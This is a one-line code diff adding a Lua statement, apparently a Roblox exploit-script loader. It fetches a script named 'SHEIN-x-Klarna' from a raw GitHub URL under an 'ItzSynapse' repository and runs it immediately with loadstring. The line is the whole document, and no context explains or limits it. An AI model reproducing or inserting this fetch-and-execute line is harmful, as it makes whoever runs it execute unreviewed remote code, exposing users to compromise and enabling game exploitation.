@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ItzSynapse/Scripts/main/SHEIN-x-Klarna'))()
